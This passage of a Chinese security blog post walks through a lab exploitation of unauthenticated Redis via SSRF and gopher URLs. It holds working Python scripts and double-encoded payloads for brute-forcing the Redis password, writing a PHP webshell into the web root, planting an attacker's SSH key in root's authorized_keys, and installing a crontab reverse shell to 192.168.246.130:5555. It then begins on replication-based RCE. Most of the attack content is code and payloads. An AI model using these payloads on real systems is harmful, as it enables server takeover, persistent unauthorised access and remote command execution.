        payload = <span class="hljs-string">r"gopher://"</span> + rhost + <span class="hljs-string">":"</span> + rport + <span class="hljs-string">"/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524"</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r"%250d%250a"</span>+passwd+<span class="hljs-string">r"%250D%250A%252A1%250D%250A"</span>
        url = target+<span class="hljs-built_in">str</span>(payload)
        text = requests.get(url).text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> text:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 爆破成功 密码为: "</span> + passwd)
            <span class="hljs-built_in">print</span>(text + payload)
            <span class="hljs-keyword">break</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228202916199.png" alt="image-20231228202916199"></p>
<p>上图为简单的字典，如下图可以看到最后停在了hybcx这里，说明密码为hybcx</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228203032489.png" alt="image-20231228203032489"></p>
<p>如下图检验成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228203105346.png" alt="image-20231228203105346"></p>
<h2 id="绝对路径写webshell">绝对路径写webshell</h2>
<p>据说这个方法是最常用的</p>
<h3 id="构造payload">构造payload</h3>
<p>先构造redis命令</p>
<pre><code class="hljs sh">flushall  	<span class="hljs-comment">#删除redis数据库中所有的key</span>
<span class="hljs-built_in">set</span> 1 <span class="hljs-string">'&lt;?php eval($_GET["cmd"]);?&gt;'</span>		<span class="hljs-comment">#设置键1，值为一句话木马</span>
config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html		<span class="hljs-comment">#设置redis数据库文件存储位置，这里设置为了web目录</span>
<span class="hljs-comment">#设置数据库文件名为shell.php，这里是指示redis在下一次保存其数据库时存储为 web目录/shell.php</span>
config <span class="hljs-built_in">set</span> dbfilename shell.php		
save	<span class="hljs-comment">#这个命令告诉Redis立即同步保存数据到磁盘上的数据库文件</span></code></pre>
<p>这里的目的就是向对方服务器的web目录写入一句话木马。这里师傅自己写了个转化为redis RESP协议格式的脚本，这里我直接cv了（我是大彩笔~~）</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename=<span class="hljs-string">"shell.php"</span>
path=<span class="hljs-string">"/var/www/html"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span>(payload)</code></pre>
<p>得到的payload如下，不过下面只进行了一次url编码，而如果我们利用的是ssrf的话，一般就要编码两次</p>
<pre><code class="hljs plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%
0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
//二次编码后
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%2
53Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250A
dir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p>最后在ssrf.php发送上述payload即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229142501547.png" alt="image-20231229142501547"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229142516461.png" alt="image-20231229142516461"></p>
<p>服务端看到木马成功写入，下图验证成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229142530303.png" alt="image-20231229142530303"></p>
<p>在这里推荐一个工具，虽然之前的文章gopherus工具就可以打redis，不过感觉这个更专业</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LS95/gopher-redis-auth">gopher-redis-auth</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229143001471.png" alt="image-20231229143001471"></p>
<p>py2环境下运行，得到的内容记得二次编码发送</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229143034128.png" alt="image-20231229143034128"></p>
<p>依旧成功写入</p>
<h2 id="写ssh公钥">写ssh公钥</h2>
<p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code>；如果不存在，则可以利用<code>crontab</code>创建该目录</p>
<p>不过需要注意，这种方法需要确保靶机允许使用密钥登录。</p>
<p>开启方法：需要修改 ssh 配置文件 /etc/ssh/sshd_config</p>
<pre><code class="hljs sh"><span class="hljs-comment">#StrictModes yes</span>
改为
StrictModes no
然后重启sshd即可
/bin/systemctl restart  sshd.service</code></pre>
<p>我们先直接尝试ssh登录靶机试试：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229143701556.png" alt="image-20231229143701556"></p>
<p>可以看到是需要登录密码的，那我们开始攻击</p>
<h3 id="生成攻击机公钥">生成攻击机公钥</h3>
<p>这里呢我对公钥私钥的原理什么的忘记了，具体原理我认为可以参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/267701810">SSH 的原理与应用</a></p>
<p>其中对咱们这次的攻击思路有帮助的是</p>
<pre><code class="hljs plaintext">使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。

所谓"公钥登录"，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。

这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个： $ ssh-keygen

运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。
运行结束以后，在~/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是公钥，后者是私钥。</code></pre>
<p>这也就是说我们可以想办法将自己攻击机的公钥发送到对方服务器上，这样我们以后对其请求远程连接的时候就没必要输入密码了。</p>
<pre><code class="hljs sh">ssh-keygen -t rsa</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229144834957.png" alt="image-20231229144834957"></p>
<p>这里一路回车即可，最后进入/root/.ssh目录下即可看到公钥和私钥，如下图，前者为私钥，后者为公钥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229145130446.png" alt="image-20231229145130446"></p>
<pre><code class="hljs plaintext">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali</code></pre>
<p>最后我们修改一下上述脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali\n\n"</span>
filename=<span class="hljs-string">"authorized_keys"</span>
path=<span class="hljs-string">"/root/.ssh/"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//二次编码的结果</span>
gopher%<span class="hljs-number">3</span>A<span class="hljs-comment">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rs</span>
a%<span class="hljs-number">2520</span>AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8%<span class="hljs-number">252</span>BFZ3tPB8iivCWMCVFAAby4gH7GvL%<span class="hljs-number">252</span>BDYQnOMQXsIbC3xrqQ%<span class="hljs-number">252</span>BC6O/<span class="hljs-number">4</span>T4VZey1e2JQ00O7%<span class="hljs-number">252</span>B8Kl2gWuIkPyXK
KTXm88LOfYcARETlr20%<span class="hljs-number">252</span>BINfJuzcb6ui1ZF%<span class="hljs-number">252</span>BQnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY%<span class="hljs-number">252</span>BPV3d
zqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg%<span class="hljs-number">252</span>BjmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4Te
GdbRaAcTuTkVLzBgJXDCA5n2hM%<span class="hljs-number">253</span>D%<span class="hljs-number">2520</span>root%<span class="hljs-number">2540</span>kali%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252411</span>%<span class="hljs-number">25</span>
<span class="hljs-number">0</span>D%<span class="hljs-number">250</span>A/root/.ssh/%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252415</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aauthorized_keys%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229145722322.png" alt="image-20231229145722322"></p>
<p>成功写入，接下来我们远程连接看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229145749212.png" alt="image-20231229145749212"></p>
<p>成功实现免密登录</p>
<h2 id="利用contrab计划任务反弹shell">利用contrab计划任务反弹shell</h2>
<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<p>由于系统的不同，crontrab定时文件位置也会不同</p>
<pre><code class="hljs plaintext">Centos的定时任务文件在`/var/spool/cron/&lt;username&gt;`
Ubuntu定时任务文件在`/var/spool/cron/crontabs/&lt;username&gt;`</code></pre>
<p>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
<h3 id="构造payload">构造payload</h3>
<p>这里我再复习一波bash反弹命令的原理吧：</p>
<pre><code class="hljs sh">/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[端口] 0&gt;&amp;1</code></pre>
<p>/bin/bash -i 表示的是调用bash命令的交互模式，并将交互模式重定向到 /dev/tcp/[ip]/[端口] 中。这里我们将ip和端口改为我们攻击机的地址和监听端口。</p>
<p>重定向时加入一个描述符 &amp;，表示直接作为数据流输入。不加 &amp; 时，重定向默认是输出到文件里的。</p>
<p>/dev/tcp/ip地址/端口号 是linux下的特殊文件，表示对这个地址端口进行tcp连接</p>
<p>这里我们设置成攻击机监听的地址</p>
<p>最后面的 0&gt;&amp;1 。此时攻击机和靶机已经建立好了连接，当攻击机进行输入时，就是这里的 0（标准输入）</p>
<p>通过重定向符，重定向到 1（标准输出）中，由于是作为 /bin/bash 的标准输入，所以就执行了系统命令了。</p>
<p>接下来开始写入定时任务，构造redis的命令如下：</p>
<pre><code class="hljs php">flushall
set <span class="hljs-number">1</span> <span class="hljs-string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n'</span>
config set dir /<span class="hljs-keyword">var</span>/spool/cron/
config set dbfilename root
save</code></pre>
<p>转化为redis RESP协议的格式，修改上述脚本即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>
filename=<span class="hljs-string">"root"</span>
path=<span class="hljs-string">"/var/spool/cron"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<p>二次编码后的结果如下</p>
<pre><code class="hljs plaintext">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%252A/1
%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.246.130/5555%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D
%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A/var/spool/cron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p>发送后，看一下靶机是否被成功写入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229152354736.png" alt="image-20231229152354736"></p>
<p>接着攻击机开启监听，等一会儿即可。如下图成功拿到shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229152242287.png" alt="image-20231229152242287"></p>
<p>不过这里也可以用我推荐过的工具</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229152446308.png" alt="image-20231229152446308"></p>
<p>他这里默认监听端口为1234，需要注意一下，同样二次编码后看靶机，如下图成功写入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229152024436.png" alt="image-20231229152024436"></p>
<p>成功那shell，不过这里这个工具是sh反弹，暂时也不知道这两种方式有何区别</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229151825806.png" alt="image-20231229151825806"></p>
<h1 id="0x05-redis主从复制rce">0x05 Redis主从复制RCE</h1>
<p>这里搞着搞着就到了主从复制了，回想起之前搞这玩意儿弄得心烦，环境一直搞不好，看来是时候解决了~~</p>
<h2 id="介绍">介绍</h2>
<p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">PPT</a></p>
<h2 id="利用条件">利用条件</h2>
<p>□ 能未授权或者能通过弱口令认证访问到Redis服务器</p>
<p>□ 可动态修改备份文件路径</p>
<p>□ 主从未校验可信服务端</p>
<h2 id="主从复制概念">主从复制概念</h2>
<pre><code class="hljs plaintext">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。

redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229153219790.png" alt="image-20231229153219790"></p>
<p>这里就跟着师傅搭建主从复制了，属实是不懂唉</p>
<p>建立主从复制，有3种方式：</p>
<ol>
<li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
</ol>
<p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p>
<p>这里我们在上面搭建的基础上，同一目录下新建redis6380文件，接着将之前已经有的redis目录下的redis.conf配置文件赋值到redis6380文件中，接着修改其中端口为6380即可</p>
